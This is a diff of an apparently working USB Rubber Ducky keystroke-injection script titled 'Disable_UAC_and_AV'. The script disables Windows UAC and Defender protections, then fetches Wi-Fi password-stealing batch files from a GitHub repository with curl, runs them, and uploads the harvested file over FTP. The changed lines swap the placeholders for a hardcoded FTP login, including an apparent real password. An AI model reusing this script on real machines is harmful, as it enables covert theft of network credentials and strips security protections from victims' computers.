@@ -1,8 +1,8 @@
 REM Title:         Disable_UAC_and_AV
 REM Description    Disable UAC and download py script to disable Realtime and tamper protection
 REM Author:        FX17
-REM Version:       3.0
-REM Target:        Windows 7/8/10/11
+REM Version:       2.0
+REM Target:        Windows 10
 REM Attackmodes:   HID
 
 DELAY 1000
@@ -87,26 +87,12 @@ STRING cd Documents
 ENTER
 DELAY 500
 REM Download the yoinking tools
-STRING bitsadmin /create DuckyCode
-DELAY 500
+STRING curl --output "Password Collection.bat" -OL https://raw.githubusercontent.com/Keiranos/WiFi-Password-Extract/main/Pass%20collection.bat
 ENTER
-DELAY 500
-STRING bitsadmin /addfile DuckyCode https://raw.githubusercontent.com/Keiranos/WiFi-Password-Extract/main/Pass%20collection.bat "%cd%\Password Collection.bat"
-DELAY 500
+DELAY 2000
+STRING curl --output "SSIDYoink.bat" -OL https://raw.githubusercontent.com/Keiranos/WiFi-Password-Extract/main/SSIDYoink.bat
 ENTER
-DELAY 500
-STRING bitsadmin /addfile DuckyCode https://raw.githubusercontent.com/Keiranos/WiFi-Password-Extract/main/SSIDYoink.bat "%cd%\SSIDYoink.bat"
-DELAY 500
-ENTER
-DELAY 500
-STRING bitsadmin /resume DuckyCode
-DELAY 1000
-ENTER
-DELAY 1000
-STRING bitsadmin /complete DuckyCode
-DELAY 500
-ENTER
-DELAY 1000
+DELAY 200
 STRING SSIDYoink.bat
 ENTER
 DELAY 1000
@@ -120,13 +106,13 @@ ENTER
 DELAY 200
 STRING o
 ENTER
-STRING [FTP ADDRESS] 21
+STRING 127.0.0.1 21
 ENTER
 DELAY 200
-STRING [USERNAME]
+STRING FX17
 ENTER
 DELAY 200
-STRING [PASSWORD]
+STRING Keiran1712
 ENTER
 DELAY 1000
 STRING put A.txt
